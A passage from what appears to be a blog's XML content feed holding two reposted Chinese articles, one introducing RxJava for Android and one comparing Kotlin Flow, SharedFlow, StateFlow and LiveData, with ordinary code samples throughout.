      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RxJava 简介</title>
      <link href="/2022/04/02/RxJava-%E7%AE%80%E4%BB%8B/"/>
      <url>/2022/04/02/RxJava-%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://zhuanlan.zhihu.com/p/20687178">RxJava系列1(简介)</a></p><ul><li><p><a href="https://zhuanlan.zhihu.com/p/20687178">RxJava系列1(简介)</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/20687307">RxJava系列2(基本概念及使用介绍)</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/21926591">RxJava系列3(转换操作符)</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/21966621">RxJava系列4(过滤操作符)</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/22039934">RxJava系列5(组合操作符)</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/22338235">RxJava系列6(从微观角度解读RxJava源码)</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/23108381">RxJava系列7(最佳实践)</a></p></li></ul><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>提升开发效率，降低维护成本一直是开发团队永恒不变的宗旨。近一年来国内的技术圈子中越来越多的开始提及Rx，经过一段时间的学习和探索之后我也深深的感受到了RxJava的魅力。它能帮助我们简化代码逻辑，提升代码可读性。这对于开发效率的提升、后期维护成本的降低帮助都是巨大的。个人预测RxJava一定是2016年的一个大趋势，所以也有打算将它引入到公司现有的项目中来，写这一系列的文章主要也是为了团队内部做技术分享。</p><blockquote><p>由于我本人是个Android程序猿，因此这一系列文章中的场景都是基于Android平台的。如果你是个Java Web工程师或者是其它方向的那也没关系，我会尽量用通俗的语言将问题描述清楚。</p></blockquote><h3 id="响应式编程"><a href="#响应式编程" class="headerlink" title="响应式编程"></a>响应式编程</h3><p>在介绍RxJava前，我们先聊聊响应式编程。那么什么是响应式编程呢？响应式编程是一种基于异步数据流概念的编程模式。数据流就像一条河：它可以被观测，被过滤，被操作，或者为新的消费者与另外一条流合并为一条新的流。</p><p>响应式编程的一个关键概念是事件。事件可以被等待，可以触发过程，也可以触发其它事件。事件是唯一的以合适的方式将我们的现实世界映射到我们的软件中：如果屋里太热了我们就打开一扇窗户。同样的，当我们的天气app从服务端获取到新的天气数据后，我们需要更新app上展示天气信息的UI；汽车上的车道偏移系统探测到车辆偏移了正常路线就会提醒驾驶者纠正，就是是响应事件。</p><p>今天，响应式编程最通用的一个场景是UI：我们的移动App必须做出对网络调用、用户触摸输入和系统弹框的响应。在这个世界上，软件之所以是事件驱动并响应的是因为现实生活也是如此。</p><p>本章节中部分概念摘自《RxJava Essentials》一书</p><h3 id="RxJava的来历"><a href="#RxJava的来历" class="headerlink" title="RxJava的来历"></a>RxJava的来历</h3><p>Rx是微软.Net的一个响应式扩展，Rx借助可观测的序列提供一种简单的方式来创建异步的，基于事件驱动的程序。2012年Netflix为了应对不断增长的业务需求开始将.NET Rx迁移到JVM上面。并于13年二月份正式向外展示了RxJava。<br>从语义的角度来看，RxJava就是.NET Rx。从语法的角度来看，Netflix考虑到了对应每个Rx方法,保留了Java代码规范和基本的模式。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-5643ef8aee625a15.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="什么是RxJava"><a href="#什么是RxJava" class="headerlink" title="什么是RxJava"></a>什么是RxJava</h3><p>那么到底什么是RxJava呢？我对它的定义是：RxJava本质上是一个异步操作库，是一个能让你用极其简洁的逻辑去处理繁琐复杂任务的异步事件库。</p><h3 id="RxJava好在哪"><a href="#RxJava好在哪" class="headerlink" title="RxJava好在哪"></a>RxJava好在哪</h3><p>Android平台上为已经开发者提供了AsyncTask,Handler等用来做异步操作的类库，那我们为什么还要选择RxJava呢？答案是简洁！RxJava可以用非常简洁的代码逻辑来解决复杂问题；而且即使业务逻辑的越来越复杂，它依然能够保持简洁！再配合上Lambda用简单的几行代码分分钟就解决你负责的业务问题。简直逼格爆表，拿它装逼那是极好的！</p><p>多说无益，上代码！<br>假设我们安居客用户App上有个需求，需要从服务端拉取上海浦东新区塘桥板块的所有小区Community[] communities，每个小区下包含多套房源List<House> houses；我们需要把塘桥板块的所有总价大于500W的房源都展示在App的房源列表页。用于从服务端拉取communities需要发起网络请求，比较耗时，因此需要在后台运行。而这些房源信息需要展示到App的页面上，因此需要在UI线程上执行。(<em>此例子思路来源于扔物线的<a href="https://link.zhihu.com/?target=http://gank.io/post/560e15be2dca930e00da1083">给Android开发者的RxJava详解</a>一文</em>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">new Thread() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void run() &#123;</span><br><span class="line">            super.run();</span><br><span class="line">            &#x2F;&#x2F;从服务端获取小区列表</span><br><span class="line">            List&lt;Community&gt; communities &#x3D; getCommunitiesFromServer();</span><br><span class="line">            for (Community community : communities) &#123;</span><br><span class="line">                List&lt;House&gt; houses &#x3D; community.houses;</span><br><span class="line">                for (House house : houses) &#123;</span><br><span class="line">                    if (house.price &gt;&#x3D; 5000000) &#123;</span><br><span class="line">                        runOnUiThread(new Runnable() &#123;</span><br><span class="line">                            @Override</span><br><span class="line">                            public void run() &#123;</span><br><span class="line">                                &#x2F;&#x2F;将房子的信息添加到屏幕上</span><br><span class="line">                                addHouseInformationToScreen(house);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;.start();</span><br></pre></td></tr></table></figure><p>使用RxJava的写法是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Observable.from(getCommunitiesFromServer())</span><br><span class="line">            .flatMap(new Func1&lt;Community, Observable&lt;House&gt;&gt;() &#123;</span><br><span class="line">                @Override</span><br><span class="line">                public Observable&lt;House&gt; call(Community community) &#123;</span><br><span class="line">                    return Observable.from(community.houses);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).filter(new Func1&lt;House, Boolean&gt;() &#123;</span><br><span class="line">                @Override</span><br><span class="line">                public Boolean call(House house) &#123;</span><br><span class="line">                    return house.price&gt;&#x3D;5000000;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).subscribeOn(Schedulers.io())</span><br><span class="line">            .observeOn(AndroidSchedulers.mainThread())</span><br><span class="line">            .subscribe(new Action1&lt;House&gt;() &#123;</span><br><span class="line">                @Override</span><br><span class="line">                public void call(House house) &#123;</span><br><span class="line">                    &#x2F;&#x2F;将房子的信息添加到屏幕上</span><br><span class="line">                    addHouseInformationToScreen(house);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br></pre></td></tr></table></figure><p>从上面这段代码我们可以看到：虽然代码量看起来变复杂了，但是RxJava的实现是一条链式调用，没有任何的嵌套；整个实现逻辑看起来异常简洁清晰，这对我们的编程实现和后期维护是有巨大帮助的。特别是对于那些回调嵌套的场景。配合Lambda表达式还可以简化成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Observable.from(getCommunitiesFromServer())</span><br><span class="line">            .flatMap(community -&gt; Observable.from(community.houses))</span><br><span class="line">            .filter(house -&gt; house.price&gt;&#x3D;5000000).subscribeOn(Schedulers.io())</span><br><span class="line">            .observeOn(AndroidSchedulers.mainThread())</span><br><span class="line">            .subscribe(this::addHouseInformationToScreen);</span><br></pre></td></tr></table></figure><p>简洁！有美感！这才是一个有情怀的程序员应该写出来的代码。</p><p>看完这篇文章大家应该能够理解RxJava为什么会越来越火了。它能极大的提高我们的开发效率和代码的可读性！当然了RxJava的学习曲线也是比较陡的，在后面的文章我会对主要的知识点做详细的介绍，敬请关注！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Flow 与Live Data对比</title>
      <link href="/2022/04/02/Android-Flow-%E4%B8%8ELive-Data%E5%AF%B9%E6%AF%94/"/>
      <url>/2022/04/02/Android-Flow-%E4%B8%8ELive-Data%E5%AF%B9%E6%AF%94/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://juejin.cn/post/6986265488275800072">官方推荐 Flow 取代 LiveData,有必要吗?</a><br>更加详细的文章：<a href="https://jishuin.proginn.com/p/763bfbd663b2">不做跟风党，LiveData，StateFlow，SharedFlow 的使用场景对比</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>打开<a href="https://link.juejin.cn/?target=https://developer.android.com/jetpack" title="https://developer.android.com/jetpack">Android架构组件页面</a>,我们可以发现一些最新发布的<code>jetpack</code>组件，如<code>Room</code>，<code>DataStore</code>, <code>Paging3</code>,<code>DataBinding</code> 等都支持了<code>Flow</code><br><code>Google开发者</code>账号最近也发布了几篇使用<code>Flow</code>的文章，比如：<a href="https://juejin.cn/post/6979008878029570055" title="https://juejin.cn/post/6979008878029570055">从 LiveData 迁移到 Kotlin 数据流</a><br>看起来官方在大力推荐使用<code>Flow</code>取代<code>LiveData</code>，那么问题来了,有必要吗？<br>我<code>LiveData</code>用得好好的，有必要再学<code>Flow</code>吗?本文主要回答这个问题,具体包括以下内容<br>1.<code>LiveData</code>有什么不足?<br>2.<code>Flow</code>介绍以及为什么会有<code>Flow</code><br>3.<code>SharedFlow</code>与<code>StateFlow</code>的介绍与它们之间的区别</p><p>本文具体目录如下所示：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-7d5b177c2528e0db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="1-LiveData有什么不足"><a href="#1-LiveData有什么不足" class="headerlink" title="1. LiveData有什么不足?"></a>1. LiveData有什么不足?</h1><p>要了解<code>LiveData</code>的不足，我们先了解下<code>LiveData</code>为什么被引入</p><blockquote><p><code>LiveData</code> 的历史要追溯到 2017 年。彼时，观察者模式有效简化了开发，但诸如 <code>RxJava</code> 一类的库对新手而言有些太过复杂。为此，架构组件团队打造了<code> LiveData</code>: 一个专用于 Android 的具备自主生命周期感知能力的可观察的数据存储器类。<code>LiveData</code> 被有意简化设计，这使得开发者很容易上手；而对于较为复杂的交互数据流场景，建议您使用 <code>RxJava</code>，这样两者结合的优势就发挥出来了</p></blockquote><p>可以看出,<code>LiveData</code>就是一个简单易用的，具备感知生命周期能力的观察者模式<br>它使用起来非常简单，这是它的优点，也是它的不足，因为它面对比较复杂的交互数据流场景时，处理起来比较麻烦</p><h4 id="1-2-LiveData的不足"><a href="#1-2-LiveData的不足" class="headerlink" title="1.2 LiveData的不足"></a>1.2 LiveData的不足</h4><p>我们上文说过<code>LiveData</code>结构简单，但是不够强大，它有以下不足</p><ol><li><code>LiveData</code>只能在主线程更新数据</li><li><code>LiveData</code>的操作符不够强大,在处理复杂数据流时有些捉襟见肘</li></ol><p>关于<code>LiveData</code>只能在主线程更新数据，有的同学可能要问，不是有<code>postValue</code>吗？其实<code>postValue</code>也是需要切换到到主线程的,如下图所示：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-2758932a169078f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>这意味着当我们想要更新<code>LiveData</code>对象时，我们会经常更改线程（工作线程→主线程）,如果在修改<code>LiveData</code>后又要切换回到工作线程那就更麻烦了,同时<code>postValue</code>可能会有丢数据的问题。</p><h1 id="2-Flow介绍"><a href="#2-Flow介绍" class="headerlink" title="2. Flow介绍"></a>2. Flow介绍</h1><p><code>Flow</code> 就是 Kotlin 协程与响应式编程模型结合的产物，你会发现它与 <code>RxJava</code> 非常像，二者之间也有相互转换的 API，使用起来非常方便。</p><h4 id="2-1-为什么引入Flow"><a href="#2-1-为什么引入Flow" class="headerlink" title="2.1 为什么引入Flow"></a>2.1 为什么引入Flow</h4><p>为什么引入<code>Flow</code>，我们可以从<code>Flow</code>解决了什么问题的角度切入</p><ol><li><code>LiveData</code>不支持线程切换，所有数据转换都将在主线程上完成，有时需要频繁更改线程，面对复杂数据流时处理起来比较麻烦</li><li>而<code>RxJava</code>又有些过于麻烦了，有许多让人傻傻分不清的操作符，入门门槛较高，同时需要自己处理生命周期，在生命周期结束时取消订阅</li></ol><p>可以看出，<code>Flow</code>是介于<code>LiveData</code>与<code>RxJava</code>之间的一个解决方案，它有以下特点</p><ul><li><code>Flow</code> 支持线程切换、背压</li><li><code>Flow</code> 入门的门槛很低，没有那么多傻傻分不清楚的操作符</li><li>简单的数据转换与操作符，如 <code>map</code> 等等</li><li>冷数据流，不消费则不生产数据,这一点与<code>LiveData</code>不同：<code>LiveData</code>的发送端并不依赖于接收端。</li><li>属于<code>kotlin</code>协程的一部分，可以很好的与协程基础设施结合</li></ul><p>关于<code>Flow</code>的使用，比较简单，有兴趣的同学可参阅文档：<a href="https://link.juejin.cn/?target=http://www.kotlincn.net/docs/reference/coroutines/flow.html" title="http://www.kotlincn.net/docs/reference/coroutines/flow.html">Flow文档</a></p><h1 id="3-SharedFlow介绍"><a href="#3-SharedFlow介绍" class="headerlink" title="3. SharedFlow介绍"></a>3. SharedFlow介绍</h1><p>我们上面介绍过,<code>Flow 是冷流</code>，什么是冷流？</p><ul><li><code>冷流</code> :只有订阅者订阅时，才开始执行发射数据流的代码。并且冷流和订阅者只能是一对一的关系，当有多个不同的订阅者时，消息是重新完整发送的。也就是说对冷流而言，有多个订阅者的时候，他们各自的事件是独立的。</li><li><code>热流</code>:无论有没有订阅者订阅，事件始终都会发生。当 热流有多个订阅者时，热流与订阅者们的关系是一对多的关系，可以与多个订阅者共享信息。</li></ul><h4 id="3-1-为什么引入SharedFlow"><a href="#3-1-为什么引入SharedFlow" class="headerlink" title="3.1 为什么引入SharedFlow"></a>3.1 为什么引入SharedFlow</h4><p>上面其实已经说得很清楚了，冷流和订阅者只能是一对一的关系，当我们要实现一个流，多个订阅者的需求时(这在开发中是很常见的)，就需要热流了<br>从命名上也很容易理解，SharedFlow即共享的Flow，可以实现一对多关系,SharedFlow是一种热流</p><h4 id="3-2-SharedFlow的使用"><a href="#3-2-SharedFlow的使用" class="headerlink" title="3.2 SharedFlow的使用"></a>3.2 SharedFlow的使用</h4><p>我们来看看SharedFlow的构造函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public fun &lt;T&gt; MutableSharedFlow(</span><br><span class="line">    replay: Int &#x3D; 0,</span><br><span class="line">    extraBufferCapacity: Int &#x3D; 0,</span><br><span class="line">    onBufferOverflow: BufferOverflow &#x3D; BufferOverflow.SUSPEND</span><br><span class="line">): MutableSharedFlow&lt;T&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其主要有3个参数<br>1.<code>replay</code>表示当新的订阅者<code>Collect</code>时，发送几个已经发送过的数据给它，默认为0，即默认新订阅者不会获取以前的数据<br>2.<code>extraBufferCapacity</code>表示减去<code>replay</code>，<code>MutableSharedFlow</code>还缓存多少数据，默认为0<br>3.<code>onBufferOverflow</code>表示缓存策略，即缓冲区满了之后<code>Flow</code>如何处理，默认为挂起<br>简单使用如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;ViewModel</span><br><span class="line">val sharedFlow&#x3D;MutableSharedFlow&lt;String&gt;()</span><br><span class="line"></span><br><span class="line">viewModelScope.launch&#123;</span><br><span class="line">      sharedFlow.emit(&quot;Hello&quot;)</span><br><span class="line">      sharedFlow.emit(&quot;SharedFlow&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Activity</span><br><span class="line">lifecycleScope.launch&#123;</span><br><span class="line">    viewMode.sharedFlow.collect &#123; </span><br><span class="line">       print(it)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-3-将冷流转化为SharedFlow"><a href="#3-3-将冷流转化为SharedFlow" class="headerlink" title="3.3 将冷流转化为SharedFlow"></a>3.3 将冷流转化为SharedFlow</h4><p>普通<code>flow</code>可使用<code>shareIn</code>扩展方法，转化成<code>SharedFlow</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">val sharedFlow by lazy &#123;</span><br><span class="line">    flow&lt;Int&gt; &#123;</span><br><span class="line">    &#x2F;&#x2F;...</span><br><span class="line">    &#125;.shareIn(viewModelScope, WhileSubscribed(500), 0)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>shareIn</code>主要也有三个参数：</p><blockquote><p>@param <code>scope</code> 共享开始时所在的协程作用域范围<br>@param <code>started</code> 控制共享的开始和结束的策略<br>@param <code>replay</code> 状态流的重播个数</p></blockquote><p><code>started</code> 接受以下的三个值:</p><ol><li><code>Lazily</code>: 当首个订阅者出现时开始，在<code>scope</code>指定的作用域被结束时终止。</li><li><code>Eagerly</code>: 立即开始，而在<code>scope</code>指定的作用域被结束时终止。</li><li><code>WhileSubscribed:</code> 这种情况有些复杂，后面会详细讲解</li></ol><p>对于那些只执行一次的操作，您可以使用<code>Lazily</code>或者<code>Eagerly</code>。然而，如果您需要观察其他的流，就应该使用<code>WhileSubscribed</code>来实现细微但又重要的优化工作</p><h4 id="3-4-Whilesubscribed策略"><a href="#3-4-Whilesubscribed策略" class="headerlink" title="3.4 Whilesubscribed策略"></a>3.4 Whilesubscribed策略</h4><p><code>WhileSubscribed</code>策略会在没有收集器的情况下取消上游数据流,通过<code>shareIn</code>运算符创建的<code>SharedFlow</code>会把数据暴露给视图 (<code>View</code>)，同时也会观察来自其他层级或者是上游应用的数据流。<br>让这些流持续活跃可能会引起不必要的资源浪费，例如一直通过从数据库连接、硬件传感器中读取数据等等。当您的应用转而在后台运行时，您应当保持克制并中止这些协程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public fun WhileSubscribed(</span><br><span class="line">   stopTimeoutMillis: Long &#x3D; 0,</span><br><span class="line">   replayExpirationMillis: Long &#x3D; Long.MAX_VALUE</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>如上所示，它支持两个参数：</p><ol><li><code>stopTimeoutMillis</code> 控制一个以毫秒为单位的延迟值，指的是最后一个订阅者结束订阅与停止上游流的时间差。默认值是 0 (立即停止).这个值非常有用，因为您可能并不想因为视图有几秒钟不再监听就结束上游流。这种情况非常常见——比如当用户旋转设备时，原来的视图会先被销毁，然后数秒钟内重建。</li><li><code>replayExpirationMillis</code>表示数据重播的过时时间，如果用户离开应用太久，此时您不想让用户看到陈旧的数据，你可以用到这个参数</li></ol><h1 id="4-StateFlow介绍"><a href="#4-StateFlow介绍" class="headerlink" title="4. StateFlow介绍"></a>4. StateFlow介绍</h1><h4 id="4-1-为什么引入StateFlow"><a href="#4-1-为什么引入StateFlow" class="headerlink" title="4.1 为什么引入StateFlow"></a>4.1 为什么引入StateFlow</h4><p>我们前面刚刚看了<code>SharedFlow</code>，为什么又冒出个<code>StateFlow</code>?<br><code>StateFlow</code> 是 <code>SharedFlow</code> 的一个比较特殊的变种，<code>StateFlow</code>与 <code>LiveData</code> 是最接近的，因为:</p><ol><li>它始终是有值的。</li><li>它的值是唯一的。</li><li>它允许被多个观察者共用 (因此是共享的数据流)。</li><li>它永远只会把最新的值重现给订阅者，这与活跃观察者的数量是无关的。</li></ol><p>可以看出，<code>StateFlow</code>与<code>LiveData</code>是比较接近的，可以获取当前的值，可以想像之所以引入<code>StateFlow</code>就是为了替换<code>LiveData</code></p><ol><li><code>StateFlow</code>继承于<code>SharedFlow</code>,是<code>SharedFlow</code>的一个特殊变种</li><li><code>StateFlow</code>与<code>LiveData</code>比较相近，相信之所以推出就是为了替换<code>LiveData</code></li></ol><h4 id="4-2-StateFlow的简单使用"><a href="#4-2-StateFlow的简单使用" class="headerlink" title="4.2 StateFlow的简单使用"></a>4.2 StateFlow的简单使用</h4><p>我们先来看看构造函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public fun &lt;T&gt; MutableStateFlow(value: T): MutableStateFlow&lt;T&gt; &#x3D; StateFlowImpl(value ?: NULL)</span><br></pre></td></tr></table></figure><ol><li><code>StateFlow</code>构造函数较为简单，只需要传入一个默认值</li><li><code>StateFlow</code>本质上是一个<code>replay</code>为1，并且没有缓冲区的<code>SharedFlow</code>,因此第一次订阅时会先获得默认值</li><li><code>StateFlow</code>仅在值已更新，并且值发生了变化时才会返回，即如果更新后的值没有变化，也没会回调<code>Collect</code>方法，这点与<code>LiveData</code>不同</li></ol><p>与<code>SharedFlow</code>类似，我们也可以用<code>stateIn</code>将普通流转化成<code>StateFlow</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">val result: StateFlow&lt;Result&lt;UiState&gt;&gt; &#x3D; someFlow</span><br><span class="line">    .stateIn(</span><br><span class="line">        scope &#x3D; viewModelScope, </span><br><span class="line">        started &#x3D; WhileSubscribed(5000), </span><br><span class="line">        initialValue &#x3D; Result.Loading</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>与<code>shareIn</code>类似，唯一不同的时需要传入一个默认值<br>同时之所以<code>WhileSubscribed</code>中传入了5000，是为了实现等待5秒后仍然没有订阅者存在就终止协程的功能，这个方法有以下功能</p><ul><li>用户将您的应用转至后台运行，5 秒钟后所有来自其他层的数据更新会停止，这样可以节省电量。</li><li>最新的数据仍然会被缓存，所以当用户切换回应用时，视图立即就可以得到数据进行渲染。</li><li>订阅将被重启，新数据会填充进来，当数据可用时更新视图。</li><li>在屏幕旋转时，因为重新订阅的时间在5s内，因此上游流不会中止</li></ul><h4 id="4-3-在页面中观察StateFlow"><a href="#4-3-在页面中观察StateFlow" class="headerlink" title="4.3 在页面中观察StateFlow"></a>4.3 在页面中观察StateFlow</h4><p>与<code>LiveData</code>类似，我们也需要经常在页面中观察<code>StateFlow</code><br>观察<code>StateFlow</code>需要在协程中，因此我们需要协程构建器，一般我们会使用下面几种</p><ol><li><code>lifecycleScope.launch</code> : 立即启动协程，并且在本 <code>Activity</code>或<code>Fragment</code> 销毁时结束协程。</li><li><code>LaunchWhenStarted</code> 和 <code>LaunchWhenResumed</code>,它会在<code>lifecycleOwner</code>进入X状态之前一直等待，又在离开X状态时挂起协程<br><img src="https://upload-images.jianshu.io/upload_images/15531792-4f0ffb3415b74fed.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li></ol><p>如上图所示：<br>1.使用<code>launch</code>是不安全的，在应用在后台时也会接收数据更新，可能会导致应用崩溃<br>2.使用<code>launchWhenStarted</code>或<code>launchWhenResumed</code>会好一些，在后台时不会接收数据更新，但是，上游数据流会在应用后台运行期间保持活跃，因此可能浪费一定的资源</p><p>这么说来，我们使用<code>WhileSubscribed</code>进行的配置岂不是无效了吗？订阅者一直存在，只有页面关闭时才会取消订阅<br><strong>官方推荐<code>repeatOnLifecycle</code>来构建协程</strong><br>在某个特定的状态满足时启动协程，并且在生命周期所有者退出该状态时停止协程,如下图所示。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-4467d080de8259ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>比如在某个Fragment的代码中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">onCreateView(...) &#123;</span><br><span class="line">    viewLifecycleOwner.lifecycleScope.launch &#123;</span><br><span class="line">        viewLifecycleOwner.lifecycle.repeatOnLifecycle(STARTED) &#123;</span><br><span class="line">            myViewModel.myUiState.collect &#123; ... &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当这个<code>Fragment</code>处于<code>STARTED</code>状态时会开始收集流，并且在<code>RESUMED</code>状态时保持收集，最终在<code>Fragment</code>进入<code>STOPPED</code>状态时结束收集过程。<br>结合使用<code>repeatOnLifecycle API</code>和<code>WhileSubscribed</code>,可以帮助您的应用妥善利用设备资源的同时，发挥最佳性能</p><h4 id="4-4-页面中观察Flow的最佳方式"><a href="#4-4-页面中观察Flow的最佳方式" class="headerlink" title="4.4 页面中观察Flow的最佳方式"></a>4.4 页面中观察Flow的最佳方式</h4><p>通过<code>ViewModel</code>暴露数据，并在页面中获取的最佳方式是:</p><ul><li>✔️ 使用带超时参数的 <code>WhileSubscribed</code> 策略暴露 <code>Flow</code>。<a href="https://link.juejin.cn/?target=https://gist.github.com/JoseAlcerreca/4eb0be817d8f94880dab279d1c27a4af" title="https://gist.github.com/JoseAlcerreca/4eb0be817d8f94880dab279d1c27a4af">示例 1</a></li><li>✔️ 使用 <code>repeatOnLifecycle</code> 来收集数据更新。<a href="https://link.juejin.cn/?target=https://gist.github.com/JoseAlcerreca/6e2620b5615425a516635744ba59892e" title="https://gist.github.com/JoseAlcerreca/6e2620b5615425a516635744ba59892e">示例 2</a><br><img src="https://upload-images.jianshu.io/upload_images/15531792-836d45c2331610f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li></ul><p>最佳实践如上图所示，如果采用其他方式，上游数据流会被一直保持活跃，导致资源浪费<br>当然，如果您并不需要使用到<code>Kotlin Flow</code>的强大功能，就用<code>LiveData</code>好了 :)</p><h1 id="5-StateFlow与SharedFlow有什么区别？"><a href="#5-StateFlow与SharedFlow有什么区别？" class="headerlink" title="5 StateFlow与SharedFlow有什么区别？"></a>5 StateFlow与SharedFlow有什么区别？</h1><p>从上文其实可以看出，<code>StateFlow</code>与<code>SharedFlow</code>其实是挺像的，让人有些傻傻分不清，有时候也挺难选择该用哪个的<br>我们总结一下，它们的区别如下:</p><ol><li><code>SharedFlow</code>配置更为灵活，支持配置<code>replay</code>,缓冲区大小等，<code>StateFlow</code>是<code>SharedFlow</code>的特化版本，<code>replay</code>固定为1，缓冲区大小默认为0</li><li><code>StateFlow</code>与<code>LiveData</code>类似，支持通过<code>myFlow.value</code>获取当前状态，如果有这个需求，必须使用<code>StateFlow</code></li><li><code>SharedFlow</code>支持发出和收集重复值，而<code>StateFlow</code>当<code>value</code>重复时，不会回调<code>collect</code><br>对于新的订阅者，<code>StateFlow</code>只会重播当前最新值，<code>SharedFlow</code>可配置重播元素个数（默认为0，即不重播）</li></ol><p>可以看出,<code>StateFlow</code>为我们做了一些默认的配置，在<code>SharedFlow</code>上添加了一些默认约束，这些配置可能并不符合我们的要求</p><ol><li>它忽略重复的值，并且是不可配置的。这会带来一些问题，比如当往<code>List</code>中添加元素并更新时，<code>StateFlow</code>会认为是重复的值并忽略</li><li>它需要一个初始值，并且在开始订阅时会回调初始值，这有可能不是我们想要的</li><li>它默认是粘性的，新用户订阅会获得当前的最新值，而且是不可配置的,而<code>SharedFlow</code>可以修改<code>replay</code></li></ol><p><code>StateFlow</code>施加在<code>SharedFlow</code>上的约束可能不是最适合您，如果不需要访问<code>myFlow.value</code>，并且享受<code>SharedFlow</code>的灵活性，可以选择考虑使用<code>SharedFlow</code></p><h1 id="总结"><a href="#总结" class="headerlink" 